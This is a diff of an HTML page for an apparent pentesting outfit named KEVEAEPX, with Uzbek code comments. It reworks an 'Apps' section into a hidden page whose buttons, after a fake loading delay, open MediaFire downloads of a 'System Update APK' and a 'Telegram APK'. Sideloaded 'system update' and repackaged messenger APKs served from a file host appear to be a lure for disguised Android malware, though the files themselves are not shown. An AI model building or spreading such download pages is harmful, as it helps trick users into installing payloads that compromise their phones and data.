@@ -11,51 +11,53 @@
     <h1>KEVEAEPX</h1>
     <p>Advanced Pentesting Tests and Tools</p>
     <nav>
-      <a href="#"
-         class="apps-button"
-         id="openAppsModal">Apps</a>
+      <a href="#" class="apps-button" id="openAppsPage">Apps</a>
     </nav>
   </header>
 
-  <section class="services">
-    <h2>Our Services</h2>
-    <ul>
-      <li>Vulnerability Scanning</li>
-      <li>Network Penetration Testing</li>
-      <li>Web Application Testing</li>
-      <li>Social Engineering Simulations</li>
-    </ul>
-  </section>
+  <main id="mainContent">
+    <section class="services">
+      <h2>Our Services</h2>
+      <ul>
+        <li>Vulnerability Scanning</li>
+        <li>Network Penetration Testing</li>
+        <li>Web Application Testing</li>
+        <li>Social Engineering Simulations</li>
+      </ul>
+    </section>
 
-  <section class="tools">
-    <h2>Tools We Use</h2>
-    <p>Nmap, Metasploit, Burp Suite, Wireshark, Python Scripts, and more.</p>
-  </section>
+    <section class="tools">
+      <h2>Tools We Use</h2>
+      <p>Nmap, Metasploit, Burp Suite, Wireshark, Python Scripts, and more.</p>
+    </section>
 
-  <!-- Apps Modal -->
-  <div id="appsModal" class="modal">
-    <div class="modal-content">
-      <span class="close" id="closeAppsModal">&times;</span>
+    <section class="contact">
+      <h2>Contact Us</h2>
+      <form>
+        <input type="text" placeholder="Your Name" required />
+        <input type="email" placeholder="Your Email" required />
+        <textarea placeholder="Your Message"></textarea>
+        <button type="submit">Send</button>
+      </form>
+    </section>
+  </main>
+
+  <!-- Apps Page (hidden by default) -->
+  <section id="appsPage" style="display:none;">
+    <div class="apps-header">
+      <button id="backHome" class="home-btn">&#8592; Home</button>
       <h2>Download Apps</h2>
-      <div class="app-links">
-        <a href="https://www.mediafire.com/file/tze7hpy4n47et28/system-upd_2.0.12-AS12791-fxj.apk/file" target="_blank" class="app-card">
-          <strong>System Update APK v2.0.12</strong>
-        </a>
-        <a href="https://www.mediafire.com/file/km2o8u3gdacmyzy/Telegram_11.12.0.apk/file" target="_blank" class="app-card">
-          <strong>Telegram APK v11.12.0</strong>
-        </a>
-      </div>
     </div>
-  </div>
-
-  <section class="contact">
-    <h2>Contact Us</h2>
-    <form>
-      <input type="text" placeholder="Your Name" required />
-      <input type="email" placeholder="Your Email" required />
-      <textarea placeholder="Your Message"></textarea>
-      <button type="submit">Send</button>
-    </form>
+    <div class="app-links">
+      <button class="app-card download-btn" data-href="https://www.mediafire.com/file/tze7hpy4n47et28/system-upd_2.0.12-AS12791-fxj.apk/file">
+        System Update APK v2.0.12
+        <span class="spinner" style="display:none;"></span>
+      </button>
+      <button class="app-card download-btn" data-href="https://www.mediafire.com/file/km2o8u3gdacmyzy/Telegram_11.12.0.apk/file">
+        Telegram APK v11.12.0
+        <span class="spinner" style="display:none;"></span>
+      </button>
+    </div>
   </section>
 
   <footer>
@@ -63,15 +65,37 @@
   </footer>
 
   <script>
-    // Modal ochish va yopish uchun JS
-    const openBtn = document.getElementById('openAppsModal');
-    const modal = document.getElementById('appsModal');
-    const closeBtn = document.getElementById('closeAppsModal');
-    openBtn.onclick = function() { modal.style.display = "block"; }
-    closeBtn.onclick = function() { modal.style.display = "none"; }
-    window.onclick = function(event) {
-      if (event.target == modal) { modal.style.display = "none"; }
-    }
+    // Apps sahifasini ko'rsatish va yashirish
+    const openAppsPage = document.getElementById('openAppsPage');
+    const appsPage = document.getElementById('appsPage');
+    const mainContent = document.getElementById('mainContent');
+    const backHome = document.getElementById('backHome');
+
+    openAppsPage.onclick = function(e) {
+      e.preventDefault();
+      mainContent.style.display = "none";
+      appsPage.style.display = "block";
+    };
+    backHome.onclick = function() {
+      appsPage.style.display = "none";
+      mainContent.style.display = "block";
+    };
+
+    // Download tugmasi uchun loading effekti
+    document.querySelectorAll('.download-btn').forEach(btn => {
+      btn.onclick = function() {
+        const spinner = btn.querySelector('.spinner');
+        spinner.style.display = "inline-block";
+        btn.disabled = true;
+        btn.innerHTML = btn.textContent + ' <span class="spinner"></span>';
+        setTimeout(() => {
+          window.open(btn.getAttribute('data-href'), '_blank');
+          spinner.style.display = "none";
+          btn.disabled = false;
+          btn.innerHTML = btn.textContent;
+        }, 1500); // 1.5 sekund loading effekti
+      };
+    });
   </script>
 </body>
 </html>
